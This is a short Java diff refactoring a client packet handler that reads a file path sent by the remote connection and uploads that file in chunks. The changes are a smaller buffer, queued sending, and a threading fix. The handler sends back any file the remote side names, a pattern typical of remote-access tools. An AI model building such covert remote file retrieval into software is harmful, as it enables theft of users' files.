@@ -17,19 +17,19 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 		final File file = new File(Connection.instance.readLine());
 
 		if (file.exists() && file.isFile()) {
+			Connection.instance.addToSendQueue(new Packet30BeginClientUpload(file));
+
 			new Thread(new Runnable() {
 				public void run() {
 					try {
-						Connection.instance.addToSendQueue(new Packet30BeginClientUpload(file));
 
 						FileInputStream fileInput = new FileInputStream(file);
-						byte[] chunk = new byte[1024 * 1024 * 10];
+						byte[] chunk = new byte[1024 * 1024];
 
 						int read;
 						while ((read = fileInput.read(chunk)) != -1) {
 							AbstractOutgoingPacket packet = new Packet29ClientUploadPart(file, chunk, read);
-							packet.send(Connection.instance.getDataOutputStream(), Connection.instance.getStringWriter());
-
+							Connection.instance.addToSendQueue(packet);
 						}
 						fileInput.close();
 						
@@ -38,7 +38,7 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 						ex.printStackTrace();
 					}
 				}
-			}).run();
+			}).start();
 		}
 	}
 
